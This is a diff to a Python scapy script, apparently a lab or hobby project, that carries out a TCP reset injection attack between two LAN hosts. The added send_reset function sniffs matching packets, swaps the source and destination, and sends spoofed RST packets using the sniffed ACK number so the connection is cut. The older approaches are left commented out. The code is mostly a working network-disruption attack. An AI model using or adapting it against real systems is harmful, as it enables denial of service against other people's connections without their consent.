@@ -4,18 +4,41 @@ from scapy.all import *
 WINDOWS_SIZE = 512
 tcp_rst_count = 10
 
+
+def send_reset(p):
+
+    src_ip = p[IP].src
+    src_port = p[TCP].sport
+    dst_ip = p[IP].dst
+    dst_port = p[TCP].dport
+    seq = p[TCP].seq
+    ack = p[TCP].ack
+    flags = p[TCP].flags
+
+    rst_packet = IP(src = dst_ip, 
+                    dst = src_ip) / TCP(sport = dst_port,    
+                                    dport = src_port, 
+                                    flags = "R", 
+                                    seq = ack)
+
+    send(rst_packet, verbose = 0)
+    print("sending reset packet!") #(print after sending for speed)
+
+    return
+
 def tcp_throttling(source_addr: str, dest_addr: str, approach = "ACK"):
 
     #ERROR CHECK ADDRESSER
     print(f"dst host {dest_addr} and src host {source_addr}")
 
-    sniffed_packages = sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 5)
+
+    #sniffed_packages = sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 100)
     #sniffed_package = sniff(filter = f"tcp", count = 5)
-    package_sample = sniffed_packages[5] # latest packet
+    #newest_packet = sniffed_packages[99] # latest packet 
     #package_sample1 = sniffed_packages[1]
 
 
-    print(package_sample[TCP].ack)
+    #print(newest_packet[TCP].ack)
     #print(package_sample1[TCP].ack)
 
 
@@ -24,16 +47,26 @@ def tcp_throttling(source_addr: str, dest_addr: str, approach = "ACK"):
     elif approach == "RST":
         # seqs = range(package_sample[TCP].seq, max_seq, int(win / 2))
 
-        dst_port = package_sample[TCP].dport
-        src_port = package_sample[TCP].sport
-        rst_package = IP(src = source_addr, dst = dest_addr) / TCP(sport = src_port, dport = dst_port, flag = "R")
+        #sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 50) ## SKIP FIRST 100 PACKETS - to make sure there is a connection
+        sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 50, prn = send_reset) 
+
+        # while True:
+        #     newest_packet_list = sniff(filter = f"tcp and dst host {dest_addr} and src host {source_addr}", count = 1)
+        #     newest_packet = newest_packet_list[0]
+
+        #     dst_port = newest_packet[TCP].dport
+        #     src_port = newest_packet[TCP].sport
+        #     rst_packet = IP(src = dest_addr, dst = source_addr) / TCP(sport = dst_port, dport = src_port, flags = "R", seq = newest_packet[TCP].ack) # note: src and dst address and po is flipped on purpose!
+    
+        #     send(rst_packet, verbose = 0)
+        #     print("send")
     else:
         raise ValueError("Incorrect or invalid approach")
 
 
 def main():
     
-    tcp_throttling("192.168.0.116", "192.168.0.128", "RST")
+    tcp_throttling("192.168.1.203", "192.168.1.73", "RST")
     
 
 if __name__ == "__main__":
